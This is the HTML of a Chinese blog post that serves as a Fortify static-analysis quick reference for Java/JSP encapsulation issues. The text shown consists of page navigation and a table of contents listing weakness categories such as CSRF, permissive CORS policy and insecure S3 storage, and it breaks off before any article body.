<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://dayun.shystartree.online">
  <title>fortify扫描结果速查(Java/JSP)-封装 | qingyu&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="fortify扫描结果速查(Java/JSP)-封装，篇幅较大，推荐使用ctrl+F查找~~~">
<meta name="keywords" content="安全,fortify速查">
<meta property="og:type" content="article">
<meta property="og:title" content="fortify扫描结果速查(Java&#x2F;JSP)-封装">
<meta property="og:url" content="http://dayun.shystartree.online/2020/01/01/fortify扫描结果速查(Java:JSP)-封装/index.html">
<meta property="og:site_name" content="qingyu&#39;s blog">
<meta property="og:description" content="fortify扫描结果速查(Java/JSP)-封装，篇幅较大，推荐使用ctrl+F查找~~~">
<meta property="og:updated_time" content="2020-12-24T08:51:42.310Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="fortify扫描结果速查(Java&#x2F;JSP)-封装">
<meta name="twitter:description" content="fortify扫描结果速查(Java/JSP)-封装，篇幅较大，推荐使用ctrl+F查找~~~">
  
    <link rel="alternative" href="/atom.xml" title="qingyu&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.0cf68a.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #B0E0E6"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/avatar.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">QingYu</a></h1>
		</hgroup>
		
		<p class="header-subtitle">越努力越幸运</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">博客主页</a></li>
	        
				<li><a href="/tags/安全/">信息安全</a></li>
	        
				<li><a href="/tags/随记/">灵感随记</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">文章搜搜</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友情链接</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">About me</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
		        
					<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
		        
					<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #B0E0E6"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">QingYu</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>越努力越幸运<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
			        
						<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
			        
						<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 33.333333333333336%"><a href="/">博客主页</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/tags/安全/">信息安全</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/tags/随记/">灵感随记</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            <article id="post-fortify扫描结果速查(Java:JSP)-封装" class="article article-type-post " itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      fortify扫描结果速查(Java/JSP)-封装
    </h1>
  



        
        
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
        </span>

<a href="/2020/01/01/fortify扫描结果速查(Java:JSP)-封装/" class="archive-article-date">
  	<time datetime="2019-12-31T17:01:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
</a>
        
      </header>
    
    <!-- 目录内容 -->

    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
          <span class="btn-bg"></span>
          <span class="btn-text">文章导航</span>
          </p>
  <div id="toc-article" class="toc-article">
      <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
    <strong class="toc-title">文章目录</strong>
           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-JSP"><span class="toc-number">1.</span> <span class="toc-text">Java/JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.1.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><span class="toc-number">1.1.1.</span> <span class="toc-text">ADF Bad Practices: Default url-invoke-disallowed Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><span class="toc-number">1.1.2.</span> <span class="toc-text">Android Bad Practices: Encryption Secret Held in Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.1.3.</span> <span class="toc-text">Android Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.1.4.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-WebSocket-Hijacking"><span class="toc-number">1.1.5.</span> <span class="toc-text">Cross-Site WebSocket Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Based-Cross-Zone-Scripting"><span class="toc-number">1.1.6.</span> <span class="toc-text">File Based Cross-Zone Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Content-Security-Policy"><span class="toc-number">1.1.7.</span> <span class="toc-text">HTML5: Missing Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.1.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.1.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Framing-Protection"><span class="toc-number">1.1.8.</span> <span class="toc-text">HTML5: Missing Framing Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.1.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.1.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.1.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.1.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Content-Security-Policy"><span class="toc-number">1.1.9.</span> <span class="toc-text">HTML5: Overly Permissive Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.1.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.1.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.1.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.1.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.1.10.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.1.10.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-CORS-Policy"><span class="toc-number">1.1.11.</span> <span class="toc-text">HTML5: Overly Permissive CORS Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.1.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.1.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Referrer-Policy"><span class="toc-number">1.1.12.</span> <span class="toc-text">HTML5: Overly Permissive Referrer-Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.1.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.1.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Unenforced-Content-Security-Policy"><span class="toc-number">1.1.13.</span> <span class="toc-text">HTML5: Unenforced Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.1.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.1.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-Field"><span class="toc-number">1.1.14.</span> <span class="toc-text">Hidden Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.1.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.1.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-Backup-Storage"><span class="toc-number">1.1.15.</span> <span class="toc-text">Insecure Storage: Android Backup Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.1.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.1.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-External-Storage"><span class="toc-number">1.1.16.</span> <span class="toc-text">Insecure Storage: Android External Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.1.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.1.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-World-Readable-or-Writeable"><span class="toc-number">1.1.17.</span> <span class="toc-text">Insecure Storage: Android World Readable or Writeable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.1.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.1.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.1.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.1.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-HTTP-Response-Cache-Leak"><span class="toc-number">1.1.18.</span> <span class="toc-text">Insecure Storage: HTTP Response Cache Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.1.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.1.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.1.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.1.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Missing-Database-Encryption"><span class="toc-number">1.1.19.</span> <span class="toc-text">Insecure Storage: Missing Database Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.1.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.1.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Full-Anonymous-Access"><span class="toc-number">1.1.20.</span> <span class="toc-text">Insecure Storage: S3 Full Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.1.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.1.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access"><span class="toc-number">1.1.21.</span> <span class="toc-text">Insecure Storage: S3 Read ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.1.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.1.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.1.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.1.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-Anonymous-Access"><span class="toc-number">1.1.22.</span> <span class="toc-text">Insecure Storage: S3 Read Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.1.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.1.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.1.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.1.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access"><span class="toc-number">1.1.23.</span> <span class="toc-text">Insecure Storage: S3 Write ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.1.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.1.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.1.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.1.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-Anonymous-Access"><span class="toc-number">1.1.24.</span> <span class="toc-text">Insecure Storage: S3 Write Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.1.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.1.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.1.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.1.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.1.25.</span> <span class="toc-text">J2EE Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.1.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.1.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.1.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.1.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.1.26.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.1.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.1.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.1.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.1.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.1.27.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.1.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.1.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.1.27.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Sensitive-Field-Exposure"><span class="toc-number">1.1.28.</span> <span class="toc-text">Mass Assignment: Sensitive Field Exposure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.1.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.1.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.1.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li 